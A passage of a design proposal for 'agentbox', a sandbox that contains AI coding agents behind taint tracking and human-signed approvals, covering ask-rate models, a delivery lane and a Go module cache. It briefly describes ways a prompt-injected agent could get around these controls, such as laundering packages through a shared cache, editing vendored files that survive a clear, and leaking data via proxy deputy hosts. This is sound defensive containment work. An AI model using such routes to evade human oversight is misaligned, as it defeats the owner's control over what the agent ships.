# agentbox v5.3 proposals: a box agents can work in, with the same threat model

**Decision (owner, 2026-11-20):** proposals A–D are adopted into ARCHITECTURE.md v5.3 and PLAN.md v5.3 (ARCHITECTURE §17 Round 6). Proposal E is rejected (section 7). The section 2.7 gate is replaced by the owner's target in ARCHITECTURE §15: at most 1 ask per delivered change (push and PR batched into one signature), plus one per new egress host. The text below is the proposal as reviewed.

**Status:** proposals for ARCHITECTURE.md v5.3 and PLAN.md v5.3. Base: ARCHITECTURE.md v5.2 and PLAN.md v5.2 (2026-11-16). Nothing here is built. The week 1–2 code (install, generations, release) does not change. Proposal E (delivery lane) is adopted as an opt-in lane, off by default, for inert private mirror repos in GitHub Enterprise Cloud orgs only. It ships only if its live-org gates pass (R77).

**Date:** 2026-11-19.

**Inputs:** the v5.2 ask-rate baseline; four final designs (a Go module cache, a tainted-read tier, structured denials, a visible ask budget), each red-teamed and scored by three judges; an after-model that walks the combined rules; and a delivery lane (round 2, red-teamed and re-grounded, with its own ask model). A second red-team of the round-2 lane found 12 working attacks. Section 7.5b records each one with a decision (closed, narrowed, or refused by cutting the lane's scope), so the lane is adopted as an opt-in, Enterprise-Cloud-only lane (R77, R82–R89). Its model is corrected to 92.0 human-gate actions per 100 tasks when every remote is an inert Enterprise Cloud mirror, and 108.7 for CI repos (R78). This file merges them. Where the inputs disagree, section 8 shows the fix and section 9 records the decision. No question is left open.

**Conventions.**
- "§n" is always a section of ARCHITECTURE.md v5.2. A section of this file is written "section n". "PLAN row n" is a row of the PLAN.md milestone table.
- Gate ids (A-G1, X-G2, …), merged-text ids (M1–M16) and decision ids (R1–R89) are local to this file.
- "Append" adds text to the end of the named bullet, cell or paragraph. "Replace" swaps the quoted text. Fenced `markdown` blocks hold exact paste text.
- ✓ keeps its v5.2 meaning: checked against a primary source. A fact that is not checked yet names the gate that checks it, and section 9 says what happens if that gate fails.

**Contents.** 1 Why · 2 Ask rate · 3 A: Go module cache · 4 B: workspace-bound memory · 5 C: structured denials · 6 D: ask budget, quotes and batches · 7 E: delivery lane · 8 Interactions and merged text · 9 Decisions · 10 How to apply

## 1. Why

Agents (Claude Code, Codex, opencode) run inside one `Network=none` container per task. v5.2 keeps them contained. It is also slow and confusing to work in:

| What an agent hits in v5.2 | Cost | v5.3 proposal |
|---|---|---|
| Every Go task downloads every module again: HOME is tmpfs and there are no shared caches (§4.2) | 15–60 s per Go task | A. Read-only Go module cache |
| Nearly every task is tainted (section 2.1 below), so every own-scope `memory.write` goes to quarantine, where no task can read it | no working memory across tasks; about 30 human reviews per 100 tasks | B. Workspace-bound memory notes |
| Refusals are a bare 403, an unspecified "typed error", or a silent hang. Asks die with their task. A human "no" can be re-asked by rewording. | wasted model turns, duplicate PRs, lost asks | C. Structured denials |
| One PR needs two signatures (the push under the taint rule, then the always-signed PR). An agent can't see what an op costs before it runs it. | 182.7 asks per 100 tasks | D. Ask budget, quotes and delivery batches |
| Every delivery still needs a human signature, even to the agent's own inert private remote, and the owner reviews again on GitHub before merge: two gates for one delivery | 108.7 asks per 100 tasks (after D) | E. Delivery lane (opt-in, Enterprise Cloud mirrors only, R77) |

**What agents get.**
1. Warm Go module downloads after the first Go task in each taint epoch.
2. Own notes that later tasks of the same tainted epoch can read, with 0 asks and 0 reviews.
3. For every refusal: a stable code, a next move, and the one op or human command that would unblock it. No silent hangs. Asks that survive a normal task finish.
4. One signature per delivery (a push and its PR, or a push and its PR replies), a per-task ask budget the agent can see, and quotes of a plan's cost before acting.
5. A no-ask delivery lane: a tainted task may push its `agent/<name>/*` branch and open a DRAFT PR on an owner-enrolled private delivery remote with no ask; the human gate moves to reviewing and merging on GitHub (section 7). Opt-in and limited to inert mirror repos in Enterprise Cloud orgs; it ships only if gates E-G2, E-G3, E-G5 and E-G6 pass on a live Enterprise Cloud test org (R77).

**The constraint.** No §10 control gets weaker. Every §0 principle stays. Two things now outlive a task without a per-item human review: the Go module cache and workspace-bound memory notes. Sections 3.2 and 4.2 below argue, with evidence, why each one blocks the same threat as §0.6. Both end at the next `taint.clear`. Where the owner enrolls a remote in Proposal E (opt-in, R77), one action, `repo.deliver`, runs without a per-delivery signature for a tainted task, but only to an owner-enrolled inert private delivery remote whose merge, direct-push, ref, control-path, Codespaces, Actions and forking behaviour are fixed by bound, zero-bypass enterprise rules; the human gate moves to reviewing and merging on GitHub, and no §10 bound outside this lane changes (section 7).

**What v5.3 does not do.** It doesn't lower taint. It doesn't remove a signature class or widen the phone set. It adds no egress destination, no long-running service, no static uid and no nft set. It doesn't close the write-capable allowlisted-host residual (§10); no design here widens it either. The delivery lane (Proposal E, opt-in) adds one taint-exempt action, `repo.deliver`, gated by a monthly human-signed lane grant and by GitHub's own review and merge; it is `laneOnly`, never phone-eligible, and the taint exemption set stays exactly `{repo.deliver}`.

## 2. Ask rate

### 2.1 Method
- **Unit:** 100 top-level tasks started with `agentbox task new`. Children count inside their parent. (Counting the 10 children of the delegated type as tasks too gives 166 per 100 for v5.2.)
- **Ask:** one pending P that an agent op creates and that only a human signature (SSHSIG on the laptop or WebAuthn on the phone) can release. One `ask.batch` is one ask, however many members it holds.
- **Not asks:** memory reviews, alerts, and human-started admin ops (`taint.clear`, `remote.set`, `push.policy.set`, `go.private.set`, `cache.purge`, `pending.deny`, `agentbox egress allow`).
- **Count:** asks per 100 = Σ (share % × asks per task) over the 13 task types.
- **Kind of estimate:** a rule walk over the v5.2 text plus the four designs. Nothing is built, so nothing is measured.

**Main assumption: every task is tainted in steady state.** Effective taint = task OR workspace OR chain OR fetched tainted refs (§5.2). It is set for nearly every task, for five reasons:
1. Every proxy host taints except the keys-only `api` class (§6.2): npm, PyPI, crates.io, GitHub web, and the Go module proxy.
2. HOME is tmpfs and v5.2 has no shared caches (§4.2), so every Go task downloads its modules again.
3. Each agent has one workspace for all its projects (§4.1, App. C). Its taint stays until a human runs `taint.clear`, which is refused while any task on it runs (§5.2, §5.3).
4. No op syncs a local bare repo from GitHub. Pulling merged main goes through the proxy and taints. A ref that received a tainted merge taints anyone who fetches it (§6.3).
5. `gh.issue.read`, `gh.pr.read` and `app.logs` taint the caller (§5.3). Attach taints the workspace (§4.2). Onfailure tasks start tainted (§7).

About 81 of 100 tasks taint themselves. A cleared workspace is tainted again within one or two tasks. **No v5.3 design lowers taint:** the Go cache taints a caller twice before the first module byte, and B keeps §6.2 exactly.

**Other assumptions** (each one favours v5.2):
- Code ships as a PR from the box to the agent's registered private remote: one `repo.push` to `agent/<name>/*`, then one `gh.pr.create`. A PR review reply is one summary comment.
- A standing push policy covers every remote. It never helps, because every task is tainted.
- One-time setup is done: registry, Go proxy, checksum database and GitHub hosts allowlisted; Go and npm in the image.
- New hosts per task: research 1.0, deps update 0.2, delegated 0.3, new npm package 0.1, deploy 0.1, read-only 0.1. Allowlists are exact host:port, and new hosts arrive one at a time, through a link or redirect from the last allowed host.
- The human answers every ask within its 15-min expiry. There are no decide, spend or epoch-NACK asks.
- v5.3 only: agents follow the generated tool descriptions, so every push plus PR (or push plus PR replies) goes out as one `ask.batch`.

### 2.2 Asks per task type

| # | Task type | Share | v5.2 | v5.3 | What changes in v5.3 |
|---|---|---|---|---|---|
| 1 | Fix a failing Go test, no new deps, PR | 15% | 2 | 1 | push + PR in one delivery batch. Still tainted: the Go cache records the same taint as the CONNECT it replaces. The warm cache saves 15–60 s, not asks. |
| 2 | Small fix or feature, deps present, no web, PR | 15% | 2 | 1 | One batch. The workspace stays sticky-tainted. |
| 3 | Feature that needs a new npm package, PR | 10% | 2.1 | 1.1 | One batch. The 0.1 asks for a postinstall host stay single. |
| 4 | Update dependencies and fix breakage, PR | 7% | 2.2 | 1.2 | One batch. 0.2 host asks stay single. Changed installed packages show as high-risk at the next clear (a review, not an ask). |
| 5 | Research docs on the web, then code, PR | 10% | 3 | 2 | One batch. The 1.0 host asks stay single: hosts surface one at a time, and v5.3 has no egress batches (R3). Worst case, 2 hosts plus the batch, is 3 and fits the budget of 3. |
| 6 | Read-only: explain, review a diff, write a plan | 8% | 0.1 | 0.1 | Unchanged. Own-scope notes now bind with no review. |
| 7 | Triage an issue: read, reproduce, one comment | 8% | 1 | 1 | `gh.issue.comment` never joins a batch (R5). |
| 8 | Address PR review comments: fix, push, reply | 5% | 2 | 1 | push + replies batch on a private remote (1 to 3 replies on one PR; the agent supplies the PR number, and the human types it to confirm). On an internal or public remote it stays 2. |
| 9 | Open a PR for work already on a local agent branch | 5% | 2 | 1 | The tainted commits still need a signature; the push rides in the push + PR batch. |
| 10 | Deploy or update an app | 6% | 1.2 | 1.2 | No design touches app ops. Worst case (deploy, new host, rollback) is 3 and fits the budget. |
| 11 | App ops: logs, restart, fix a config file under `/srv` | 4% | 0.7 | 0.7 | Unchanged. The tainted `file.write` (0.6) is the only phone-eligible ask in the mix. |
| 12 | Delegated: a parent and 2 children, one PR | 5% | 2.3 | 1.3 | The parent's push + PR is one batch. Children get 0 asks unless the parent grants some; either a granted child asks or the parent asks after the child reports, so the count is the same. |
| 13 | Code task that first needs a missing apt tool | 2% | 3 | 2 | `workbench.add_package` (os class) stays single; the rerun's delivery is one batch. |
| | **Asks per 100 tasks** | 100% | **182.7** | **108.7** | −74.0 (−40.5%) |

About 91 of 100 tasks still need at least one ask in both versions. Batching merges asks; it never removes a task's last ask.

### 2.3 By rule and by design

| Rule | v5.2 | v5.3 |
|---|---|---|
| `repo.push` under the taint rule | 74.0 | in a batch |
| `gh.pr.create` (always signed, CLI only) | 69.0 | in a batch |
| `gh.pr.comment` (always signed, CLI only) | 5.0 | in a batch |
| Delivery batch: `push+pr` or `push+reply` (CLI only, typed member count) | — | 74.0 |
| `gh.issue.comment` alone | 8.0 | 8.0 |
| `net.allow_domain` (CLI only, host:port typed) | 15.3 | 15.3 |
| `app.deploy` with a CAS change (CLI only) | 6.4 | 6.4 |
| `app.rollback` (CLI only) | 0.6 | 0.6 |
| tainted `file.write` (phone allowed) | 2.4 | 2.4 |
| `workbench.add_package` (os class, CLI only) | 2.0 | 2.0 |
| **Total** | **182.7** | **108.7** |

Asks that need the laptop key: 98.7% in v5.2, 97.8% in v5.3 (batches are `reversible=false`). Ops reviewed stay at 182.7 per 100 tasks, now in 108.7 sittings: the 74 batches hold 148 ops.

| Design | Asks per 100 | Why |
|---|---|---|
| A. Go module cache | 0 | Using the cache records the same taint as the CONNECT it replaces, twice, before any byte. The quiet npm and pip defaults remove only update-check taint, which the baseline never counted, in every task class (R31). Go in the image removes only a one-time ask. |
| B. Workspace-bound memory | 0 | Only own-scope `memory.write` and `memory.forget` change, and those were reviews, not asks. |
| C. Structured denials | 0 | It removes waste the baseline already assumed away: re-asks after a no, duplicate PRs, asks lost when a task exits, silent hangs. |
| D. Ask budget, quotes, batches | −74.0 | One batch replaces push + PR (or push + PR reply) in 74 of 100 tasks. |
| E. Delivery lane (opt-in, R77) | 0 for CI repos; −16.7 with every remote an inert Enterprise Cloud mirror | Tainted `repo.deliver` pushes a branch and opens a draft PR with no ask; the human gate moves to GitHub review and merge. Capped at 3 tainted deliveries per agent per 24 h and 5 open per box, so with three agents and a once-daily review the box admits 5 a day. Total 92.0 human-gate actions (91.0 asks plus 1.0 hand changes on the CI repo), with 16.7 mirror-to-CI copies counted separately (section 2.9). |

### 2.4 Sensitivity

| Case | v5.2 | v5.3 | Note |
|---|---|---|---|
| Floor: no taint anywhere, every host listed, push policy on | 91 | 91 | Always-signed ops alone. A clean push runs unsigned, so the PR is a single ask and batching gains nothing. |
| The human clears taint after every tainting task | 172 asks + ~81 clears ≈ 253 signatures | 108.7 asks + ~81 clears ≈ 190 | A tainted push now rides free in the PR batch, so clearing saves almost no asks. Each clear also purges the Go cache. |
| The human answers late (asks expire at 15 min) | × 1.3–2 → 240–365 | × 1.1–1.5 → 120–165 | v5.3 asks survive a normal task finish, `ask.status` waits, and the budget of 3 turns more lateness into failed deliveries, not more asks. |
| The box makes no GitHub writes | 26.7 | 26.7 | No pairs to batch. |
| Vendor server web tools allowed | ~172.7 | ~98.7 | Research host asks drop to about 0. |
| Internal or public remotes | 182.7 | 113.7 | PR replies can't batch there; push + PR still does. |

The gap from 108.7 to the floor of 91 is 17.7: 15.3 new-host asks plus the 2.4 tainted `file.write`. So taint itself now costs only 2.4 asks per 100 tasks.

### 2.5 Human work the count leaves out
- **Memory reviews.** v5.2: about 30 per 100 tasks (0.3 notes per task, all quarantined). v5.3: own-scope task notes bind with no review, up to 50 per epoch and while the epoch is under 7 days old (R19). With a weekly clear, forced reviews are about 0. On a box nobody clears, notes quarantine again after the bound, so up to about 30 per 100. Keeping a note past a clear needs an optional review.
- **Heavier clears.** A clear now covers control paths, the dependency report with a typed high-risk count (every changed `node_modules/` or `.venv/` package is high-risk), the epoch's bound notes listed by hash, and the Go cache purge.
- **New alerts.** The bound-note digest (periodic), `quote_recon` and `quote_enum` and the per-agent recon alert, `GATE_MISMATCH` on clean tasks, and three cache integrity reasons. Only the digest fires routinely.
- **One-time work.** Allowlisting the deputy hosts for each Go agent (human-started, R4), `go.private.set`, `remote.set`, `push.policy.set`.
- **Unchanged.** GitHub labels, merges and closes have no op (§16).

### 2.6 Knock-on effects
- **Per-agent cap.** At 1.09 asks per task, the 20-asks-per-24-h cap binds after about 18 tasks a day (v5.2: about 11). The new 40-ops-reviewed cap binds after about 22. Both stay (R29).
- **Children.** Children get 0 asks unless the parent grants some. A parent budget of 3 covers its batch plus 2 grants.
- **Plan-writing tasks** quote ops and then deliver nothing. The recon alert thresholds are set so honest planning doesn't trip them (R18).
- **Benchmark.** A benchmark that never pushes, opens PRs or comments passes any ask gate while the real mix runs at 109. v5.3 fixes the benchmark mix (section 2.7).

### 2.7 Decision: replace the ≤5 asks gate (R1, R2)
**Superseded (owner, 2026-11-20).** v5.3 §15 gates "at most 1 ask per delivered change (push and PR batched into one signature), plus one per new egress host" instead of items 2 and 3 below. Items 1, 4 and 5 stay.

**Decision.** Replace "≤5 asks per 100 tasks" (§5.4, §15 weeks 15–16, PLAN row 15–16) with the gate below.

**Reason.** The floor puts a human signature on every GitHub write and every CAS-changing deploy (§0.4, §0.5, §5.3). On the baseline mix those alone are 91 per 100 tasks with no taint at all (section 2.4, first row). No design that keeps the floor can pass ≤5 on delivery work. A gate the floor fails by design can't ship: it would block the release, or push someone to weaken the floor. What ≤5 protected was human attention. The new gate measures that directly: few sittings, one per delivery, and no growth from any v5.3 feature.

**New weeks 15–16 gate.**
1. The 30 graded tasks follow the baseline mix: Go fix 4, small fix 4, new npm package 3, deps update 2, web research 3, read-only 3, issue triage 2, PR review reply 2, PR from an existing branch 1, deploy 2, app ops 1, delegated 2, apt tool 1. So 27 of 30 deliver a PR, a comment, a config change or a deploy.
2. Total asks ≤115 per 100 tasks on that mix (model: 108.7; v5.2 model: 182.7).
3. Every graded task that delivers one PR (or one push plus its replies) on one private remote, adds no host, and needs no os-class op, makes exactly 1 ask. The apt-tool task makes exactly 2: one `workbench.add_package` (os class) plus one delivery batch. A read-only task makes 0 asks unless it adds a host.
4. With any one v5.3 feature off (Go cache, bound notes, denials), asks per 100 are not lower than with it on.
5. Reported as a total, not gated: asks other than one per requested delivery: 20.3 per 100 in the model (15.3 new hosts, 2.4 tainted file writes, 0.6 rollbacks, 2.0 tool installs). New-host asks depend on which docs hosts a human pre-lists, not on agentbox code, so they are not a code gate.

### 2.8 Limits of the model
- The task mix, the new-host rates, remote visibility and agent use of `ask.batch` are assumptions, not traces. Weeks 15–16 measure them.
- The rule walk uses the v5.2 text and the four designs as merged here. Where section 8 changed a design (batch shapes, no egress family), the count was re-walked: the four-design total stays 108.7. Proposal E's delivery lane is modelled separately in section 2.9: 92.0 human-gate actions per 100 tasks with three agents, a once-daily review and every remote an inert Enterprise Cloud mirror. Ordinary CI repos can't enroll, so the planning figure stays 108.7 (R77, R78).
- The memory-review range depends on how often the human clears, which no model fixes.

### 2.9 With the delivery lane (Proposal E)
**Rejected (owner, 2026-11-20):** see section 7. The model below is kept as the record behind that decision.

**Status first: plan on 108.7 for CI repos.** Proposal E is adopted as an opt-in lane, off by default, for inert private mirror repos in GitHub Enterprise Cloud orgs only (R77, R88). A second red-team of the round-2 lane found 12 working attacks; section 7.5b records each one with a decision, and sections 7.2 to 7.4 carry the fixes. An ordinary repo with CI can't meet the preconditions (section 7.3), so for CI repos the figure is 108.7. The figures below hold only when every delivery remote is an enrolled inert Enterprise Cloud mirror.

**Headline: 92.0 human-gate actions per 100 tasks, only with all remotes as inert Enterprise Cloud mirrors; 108.7 for CI repos.** The 92.0 is 91.0 asks plus 1.0 hand changes on the CI repo (R80). It is 16.7 fewer than the four-design after-model (108.7) and 90.7 fewer than v5.2 (182.7). It corrects the earlier 78.7 and 91.0 (R78). `lane.open_per_box = 5` is a cap for the whole box, not per agent. With the three named agents (Claude Code, Codex, opencode) at 10 top-level tasks a day each, and the owner clearing lane drafts once a day, the box admits 5 lane deliveries a day, not 9. The old 78.7 holds only with one agent, or with drafts reviewed at least twice a day.

**The formula.** `gate actions = 108.7 − L`. Asks alone are `108.7 − L − H`.
- `L` is admitted lane deliveries per 100 tasks. Admitted per day = min(eligible per day, 3 × agents, 3 × agents × review sittings per day, 5 × review sittings per day). The first 3 is `lane.tainted_agent_24h` (equal to `lane.per_remote_day` with one remote per agent). The second 3 is `lane.open_per_agent`, the per-authoring-agent open-PR cap; it is set equal to `lane.tainted_agent_24h`, so it never binds below the per-agent cap and no figure below changes. The 5 is `lane.open_per_box`.
- Eligible deliveries are 59.0 per 100 tasks: the 69 PR-create deliveries minus about 10 content refusals (control paths, `.gitattributes`, renderable-with-reference, over the source caps, auto-collapse, bad commit message), rated per type below.
- At 3 agents × 10 tasks a day: 17.7 eligible a day, 5 admitted (28.2%). The other 12.7 fall back to the 1-ask `push+pr` `ask.batch` (CLI only), spread evenly over the types.
- `H` is 1.0 per 100 tasks: control-path deliveries on an enrolled remote. `ask.batch` admission refuses them with `HUMAN_ONLY` (R76), because the enterprise push ruleset blocks those paths for every actor, the owner included (zero bypass actors), so it would reject a signed batch and the owner's own push alike. Decision: on an enrolled mirror a control-path change is refused outright, and its remedy is to apply it by hand on the CI repo, never on the mirror; it reaches the mirror only through the next sync from the CI repo. A hand change on the CI repo is 0 asks, but it is more human work than the 1 signed ask it replaces, so the headline counts it as 1 human-gate action. It is not a saving (R80).
- `lane.per_remote_day = 3` is a hard cap. No acknowledgement unlocks a further delivery (R80).

| Setup | Lane deliveries a day | Gate actions per 100 (asks + hand changes on the CI repo) |
|---|---|---|
| Lane off, or CI repos (q = 100%) | 0 | **108.7** |
| 1 agent, 10 tasks a day, any review cadence | 3 | 78.7 |
| 2 agents, 10 tasks a day each, one review a day | 5 | 83.7 |
| 3 agents, 10 tasks a day each, one review a day (headline) | 5 | **92.0** |
| 3 agents, 10 tasks a day each, two reviews a day | 9 | 78.7 |
| 3 agents, one review a day, 5 tasks a day each | 5 | 75.4 |
| 3 agents, one review a day, 20 tasks a day each | 5 | 100.4 |

Once a cap binds, the saving is a fixed 5 deliveries a day for the box, so more work means more gate actions per 100.

**Human-gate row** (headline setup, per 100 tasks). These are the human actions the lane leaves or adds. Only the first three are in the headline.

| Human action | Per 100 tasks | In the headline |
|---|---|---|
| Asks | 91.0 | yes |
| Hand pushes of `HUMAN_ONLY` control-path deliveries | 1.0 | yes |
| **Headline** | **92.0** | |
| Mirror-to-CI copies: each merged lane delivery copied from the mirror to the real CI repo by hand (5 a day box-wide) | 16.7 | no, counted here |
| Lane-draft reviews and merges on GitHub (5 a day box-wide) | 16.7 | no; the owner reviewed on GitHub before the lane too |

Decision: count the copy per delivery, not per sitting, because each merged draft is a separate change the owner moves and checks against CI. With the copies added, the mirror setup comes to 108.7 human steps per 100 tasks, the same as lane off. The lane's gain is moving 16.7 signatures a day off the laptop into one daily GitHub sitting, not removing human steps.

| # | Task type | Share | v5.3 (after D) | v5.3 + E (asks + hand changes on the CI repo) | Why E moves it |
|---|---|---|---|---|---|
| 1 | Fix a failing Go test, no new deps, PR | 15% | 1 | 0.73 | 5% content-refused. 0.2 per 100 tasks touch a control path and get `HUMAN_ONLY` (a hand change on the CI repo, counted as 1). The lane admits 28.2% of the eligible rest; the others use the 1-ask batch. |
| 2 | Small fix or feature, deps present, PR | 15% | 1 | 0.75 | 10% refused (renderable with an external reference, over the caps, control path, auto-collapse). 0.4 per 100 tasks are `HUMAN_ONLY` hand changes on the CI repo. |
| 3 | Feature that needs a new npm package, PR | 10% | 1.1 | 0.87 | 19% refused; lockfiles are left out of the caps only for the parsed formats. The 0.1 host ask stays single. |
| 4 | Update dependencies, PR | 7% | 1.2 | 0.96 | 16% refused (vendor or lockfile churn, auto-collapse). 0.4 per 100 tasks are workflow or control-path edits: `HUMAN_ONLY` hand changes on the CI repo. The 0.2 host asks stay single. |
| 5 | Research on the web, then code, PR | 10% | 2 | 1.77 | 17% refused (docs with external links). The 1.0 host asks stay single: there is no egress batch (R3). |
| 6 | Read-only | 8% | 0.1 | 0.1 | Nothing delivered, so the lane never applies. |
| 7 | Triage an issue, one comment | 8% | 1 | 1 | `gh.issue.comment` is always signed and is not a lane op. |
| 8 | Address PR review comments | 5% | 1 | 1 | The lane is create-only. It can't update a PR or reply to one. The `push+reply` batch stays. |
| 9 | Open a PR for work on a local branch | 5% | 1 | 0.77 | 20% refused (attach work runs over the 600-line or 25-file caps). |
| 10 | Deploy or update an app | 6% | 1.2 | 1.2 | The lane covers GitHub delivery only. |
| 11 | App ops | 4% | 0.7 | 0.7 | Unchanged. |
| 12 | Delegated: parent and 2 children, one PR | 5% | 1.3 | 1.1 | One delivery per trace; 30% refused. The 0.3 child-host asks stay single. |
| 13 | Code task needing a missing apt tool | 2% | 2 | 1.79 | `workbench.add_package` (os class) stays single; 25% refused. |
| | **Gate actions per 100 tasks** | 100% | **108.7** | **92.0** | −16.7 |

**By rule at 92.0:** 16.7 lane deliveries (0 asks); 1.0 `HUMAN_ONLY` control-path deliveries (hand changes on the CI repo, 1 human-gate action each); 51.3 `push+pr` batches; 5.0 `push+reply` batches; 8.0 `gh.issue.comment`; 15.3 `net.allow_domain`; 6.4 `app.deploy`; 0.6 `app.rollback`; 2.4 tainted `file.write`; 2.0 `workbench.add_package`. The asks sum to 91.0; with the 1.0 hand changes on the CI repo the headline is 92.0.

**Sensitivity** (3 agents, one review a day, unless stated):
- **PR-delivery share** (base 69%, other types scaled to fill the rest): 50% gives 83.2 (lane off 99.9); 85% gives 99.4 (lane off 116.1); 100% gives 106.4 (lane off 123.0).
- **Share q of repos that can't meet the lane preconditions** (an org inside an Enterprise Cloud enterprise, not a fork, Actions off, no dev container paths, zero-bypass enterprise rulesets on every ref, the bound IP allow list, no other app installation in the org): every repo in a Team org counts as unable to meet them (R88). 25% gives 92.0; 50% gives 92.0; 75% gives 94.0; 90% gives 102.8; 100% gives 108.7. Up to about q = 72% the box cap still binds, so the saving holds. Decision: for an ordinary repo that has CI, and for any repo in a Team org, q is 100%, so the figure is 108.7. The 92.0 needs every remote to be an inert mirror repo in an Enterprise Cloud org, with each merged lane delivery copied to the CI repo by hand (counted in the human-gate row).
- **Public remotes.** The lane refuses public remotes, and a PR reply can't batch on a public remote (+1 ask for type 8). 25% public gives 93.3; 50% gives 94.5; 100% gives 113.7, the same as the internal or public row in section 2.4.
- **Per-project workspaces: 92.0** (R79). Taint scoped per (agent, project) removes about 0 asks from taint: 81 of 100 tasks taint themselves, and a project workspace is tainted again within 1 to 2 tasks. `lane.tainted_agent_24h` stays per agent and does not follow the project, because it bounds attacks 17 and 22 by volume per agent. `lane.open_per_box` binds either way. With two reviews a day it is 78.7 (75.4 if the cap followed the project, which R79 refuses). Per-project workspaces close the cross-project copy-in attack (attack 4) but change no ask. This replaces the earlier 58.7, which assumed a per-project tainted cap and did not apply the box-wide cap across three agents.
- **depcheck lockfile coverage.** depcheck parses `go.sum`, `package-lock.json`, `Cargo.lock`, `uv.lock` and `requirements*.txt`, but NOT `pnpm-lock.yaml`, `yarn.lock`, `poetry.lock`, `Pipfile.lock`, `Gemfile.lock`, `composer.lock` or `bun.lockb`. In those repos the lockfile counts as source, which pushes most dependency deliveries past the 600-line cap or into auto-collapse. The headline stays 92.0 while the box cap binds.

**Human work the count leaves out:** 45 to 70 min of setup per remote plus a 30-day re-enrollment; typing the owner review IPs and the verifier egress IP at enrollment and re-enrolling when they change; mirror cleanup: deleting merged `agent/**` branches or editing CODEOWNERS on the mirror needs an enterprise owner to lift the zero-bypass ruleset, which changes `settingsHash`, suspends the lane and needs re-enrollment, about 15 min per cleanup (lift, delete or edit, restore, re-enroll), recommended once a month with the 30-day re-enrollment (R74); running the off-box verifier and its audit-log stream. The draft reviews and the mirror-to-CI copies are in the human-gate row above. The pre-merge lane-digest review is a duty, not an ask, and never unlocks more deliveries (R80).

**Decisions folded in from the model.** Keep the round-2 single-digit caps; they bound attacks 17 and 22 (R75). Count the box-wide cap across all agents, so the headline is 92.0, not 78.7 (R78). Keep `lane.tainted_agent_24h` per agent under per-project workspaces (R79). Count each `HUMAN_ONLY` hand change on the CI repo as 1 human-gate action in the headline (R76, R80). State the headline as conditional on an all-mirror Enterprise Cloud setup, and 108.7 for CI repos (R77, R88). No §10 bound outside the lane changes. The figures are a rule walk on the same 13-type mix, not traces. The refusal rates and the review cadence are assumptions that weeks 15–16 measure. A code- or docs-heavy real mix would push more deliveries to `ask.batch`.

## 3. Proposal A: read-only Go module cache

### 3.1 Problem
- `GOMODCACHE` lives in the tmpfs HOME, so every Go task downloads every module again: about 15 s at 100 Mbit/s and 60 s at 20 Mbit/s for a ~60-module repo (~150 MB of zips).
- v5.2 bans shared caches (§4.2, §16; round-3 fix "Shared HOME defeats task isolation"). A naive shared cache is cross-task persistence (§0.6) and a laundering path: an injected task pre-fills attacker packages, and a later clean task reads them untainted.
- With a fresh HOME, npm's audit, fund and update checks and pip's version check run in every task, and taint it. They fetch nothing the task asked for.
- Go is not in the task image (§13), so the first Go task on a box costs a `workbench.add_package` ask.
- `taint review` shows a changed `vendor/`, `node_modules/` or `.venv/` tree as thousands of file lines. A vendored file edited while its pin is left alone can pass a clear and then run in a clean task with no re-taint (red-team attack 4, high).
- npm and Python keep installed trees in the project (`node_modules/`, `.venv/`), and those already persist in the workspace. Only Go loses its download cache per task.

### 3.2 Design
Base: a read-only Go module cache inside `agentbox-proxy`, one store per agent. Only the proxy fills it, only with files whose hash matches the record `sum.golang.org` signed, and every use taints the caller first.

| Part | What it does |
|---|---|
| Task env | rootd sets the Go env at `task.start` from the agent's allowlist. With `proxy.golang.org:443`: `GOPROXY=http://127.0.0.1:8083,https://proxy.golang.org,direct` and `GOSUMDB=sum.golang.org`. Without it: `GOPROXY=off`. Always `GOTOOLCHAIN=local`. `GOPRIVATE` from the admin's `go.private`. taskrun unsets `GOFLAGS`, `GONOSUMDB`, `GONOPROXY` and `GOINSECURE`. Quiet npm and pip. |
| Task-side filter | taskrun serves `127.0.0.1:8083`. It forwards only `.mod` and `.zip` for exact canonical versions, after it records the task's taint through the gate and checks the version live upstream over TLS. Unsigned requests (`@v/list`, `@latest`, `/sumdb/`) get the filter's own 404, so go fetches them from proxy.golang.org end to end. |
| Proxy cache | `GET /_cache/go/...` on a task's own proxy socket: grammar, allowlist, taint first, then hit or fill. A fill is checked against the signed checksum database, with the pinned key, before it is stored. |
| Store | `data/cache/<agent>`: one btrfs subvolume per agent, in its `1/N`, with its own limit. Caps and LRU eviction. `taint.clear` purges it first, so the store is empty whenever the workspace is clean. |
| Dependency report | A sandboxed `agentbox-depcheck@` maps every changed file under `vendor/`, `node_modules/` and `.venv/` to its package and ranks high-risk items first. A clear needs a typed count of them, bound into H. Attach gets a separate `--ack-dependency-changes`. |
| Deputy hosts | `proxy.golang.org` and `sum.golang.org` fetch any origin a module path names, so data can leave through them. They are never in `common.list`, only a human can add them (R4), and the approval shows a fixed DEPUTY HOST line. |
| Service hardening | Every non-root agentbox service installs a seccomp filter that refuses btrfs ioctls, so no service can create a nested subvolume. |
| Go in the image | mise installs a pinned Go with the 3-day cooldown. |

**Why Go, and why a filter.** The design checked these in the go1.27.4 source (`cmd/go/internal`) ✓. A-G3 re-checks them on the image's Go.
- In a comma-separated `GOPROXY`, go moves to the next entry only when an entry answers 404 or 410 (`modfetch/proxy.go`, TryProxies). The checksum database works the same way: go asks each entry for `/sumdb/sum.golang.org/supported` and moves on after a 404 (`modfetch/sumdb.go`).
- go checks every `.mod` and `.zip` against go.sum, or against the signed checksum database when go.sum has no line (`modfetch/fetch.go`, checkModSum).
- go sends every request type to the first entry first, including the unsigned `@v/list`, `@latest` and `.info`. If that entry were the proxy, a compromised proxy could answer them. So the first entry is a filter inside the task, and the proxy never sees an unsigned Go request.
- `cmd/go` uses `ProxyFromEnvironment` (`web/http.go`), which skips loopback URLs (httpproxy `useProxy`). So go reaches the filter directly, and its fallbacks use CONNECT.
- An explicit `-mod` makes go ignore `vendor/` (`modload/init.go`, setDefaultBuildMod), so taskrun does not set `GOFLAGS=-mod=readonly`. Build commands already never resolve an unpinned version.

**Why §0.6 still holds (the narrower form, argued).** §0.6 exists to stop a task from leaving code, config or credentials that steer a later task (§10 "Persistence across tasks"). The literal text holds: the task writes nothing to the cache; the proxy does. The narrower reading is: nothing a task authors survives outside the workspace, and nothing it influences outlives the workspace's taint. The cache meets it:
1. **No write path.** Tasks have no mount of the store, only a GET grammar that is checked twice, and a request path never becomes a file name. Only the proxy writes, and no non-root service can make a nested subvolume.
2. **Fixed content.** The store holds only `.mod` and `.zip` files whose h1 equals the record `sum.golang.org` signed: public bytes any task can fetch upstream at any time. No task authors any of them. `.info`, lists and checksum data never come from the cache.
